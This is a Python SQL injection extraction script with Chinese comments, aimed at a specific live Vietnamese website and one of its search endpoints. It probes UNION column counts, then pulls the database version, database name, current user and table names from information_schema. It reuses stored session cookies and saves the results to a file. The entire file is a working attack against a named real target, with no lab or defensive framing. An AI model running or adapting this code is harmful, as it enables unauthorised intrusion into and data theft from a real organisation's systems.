#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import re
import urllib3
urllib3.disable_warnings()

class RealSQLiExtract:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.db_info = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_union_columns(self, endpoint, param='Type'):
        """测试Union列数"""
        print(f"[*] 测试Union列数: {endpoint}")
        
        normal_url = f"{self.base_url}{endpoint}?{param}="
        normal_r = self.session.get(normal_url, timeout=10)
        normal_data = json.loads(normal_r.text) if normal_r.text.startswith('[') else []
        
        for cols in range(1, 10):
            payload = f"1' UNION SELECT {','.join(['NULL'] * cols)}--"
            url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
            try:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200:
                    try:
                        data = json.loads(r.text)
                        # 检查是否有NULL值或异常数据
                        if isinstance(data, list):
                            for item in data:
                                for k, v in item.items():
                                    if v is None or (isinstance(v, str) and v.lower() in ['null', 'test', 'version', 'database']):
                                        print(f"    [+] 列数: {cols}")
                                        return cols
                    except:
                        if len(r.text) != len(normal_r.text):
                            print(f"    [+] 可能列数: {cols} (长度差异)")
                            return cols
            except:
                pass
        return None
    
    def extract_with_union(self, endpoint, param, query, label, columns=1):
        """使用Union提取"""
        print(f"\n[*] 提取: {label}")
        
        payloads = [
            f"1' UNION SELECT {query}--",
            f"1' UNION SELECT {query},NULL--",
            f"1' UNION SELECT NULL,{query}--",
            f"1' UNION SELECT NULL,{query},NULL--",
        ]
        
        for payload in payloads[:columns+2]:
            url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
            try:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200:
                    try:
                        data = json.loads(r.text)
                        # 查找异常数据
                        for item in data:
                            for k, v in item.items():
                                if v and isinstance(v, str):
                                    # 检查是否是数据库信息
                                    if any(keyword in v.lower() for keyword in ['mysql', 'microsoft', 'sql server', '@', '.', 'localhost']):
                                        print(f"    [+] {label}: {v}")
                                        return v
                                    # 检查是否是版本号格式
                                    if re.match(r'\d+\.\d+', v):
                                        print(f"    [+] {label}: {v}")
                                        return v
                    except:
                        # 检查响应文本
                        if query.split()[1].lower() in r.text.lower():
                            # 提取值
                            match = re.search(r'([a-zA-Z0-9_\.-]+)', r.text)
                            if match:
                                value = match.group(1)
                                if len(value) > 3:
                                    print(f"    [+] {label}: {value}")
                                    return value
            except:
                pass
        
        return None
    
    def extract_tables_with_union(self, endpoint, param, columns=1):
        """提取表名"""
        print(f"\n[*] 提取表名: {endpoint}")
        
        query = "GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()"
        payload = f"1' UNION SELECT {query}--"
        
        url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
        try:
            r = self.session.get(url, timeout=10)
            if r.status_code == 200:
                try:
                    data = json.loads(r.text)
                    # 查找表名
                    for item in data:
                        for k, v in item.items():
                            if v and isinstance(v, str) and (',' in v or len(v) > 10):
                                # 可能是表名列表
                                if any(char.isalpha() for char in v):
                                    print(f"    [+] 表名: {v[:200]}")
                                    tables = v.split(',') if ',' in v else [v]
                                    return tables
                except:
                    # 文本提取
                    if 'table' in r.text.lower():
                        print(f"    响应: {r.text[:500]}")
        except:
            pass
        
        return None
    
    def run_all(self):
        """执行提取"""
        print("="*60)
        print("真实SQL注入数据库提取")
        print("="*60)
        
        endpoint = '/Handle/SearchListProvince'
        param = 'Type'
        
        # 测试列数
        cols = self.test_union_columns(endpoint, param)
        if not cols:
            cols = 1
        
        # 提取版本
        version = self.extract_with_union(endpoint, param, "version()", "数据库版本", cols)
        if version:
            self.db_info['version'] = version
        
        # 提取数据库名
        db_name = self.extract_with_union(endpoint, param, "database()", "数据库名", cols)
        if db_name:
            self.db_info['database'] = db_name
        
        # 提取用户
        user = self.extract_with_union(endpoint, param, "user()", "当前用户", cols)
        if user:
            self.db_info['user'] = user
        
        # 提取表名
        if db_name:
            tables = self.extract_tables_with_union(endpoint, param, cols)
            if tables:
                self.db_info['tables'] = tables
        
        # 保存结果
        with open('real_db_extracted.json', 'w', encoding='utf-8') as f:
            json.dump(self.db_info, f, indent=2, ensure_ascii=False)
        
        print("\n" + "="*60)
        print("提取结果")
        print("="*60)
        for k, v in self.db_info.items():
            if isinstance(v, list):
                print(f"{k}: {len(v)} 项 - {v[:5]}")
            else:
                print(f"{k}: {v}")
        
        return self.db_info

if __name__ == "__main__":
    extractor = RealSQLiExtract()
    extractor.run_all()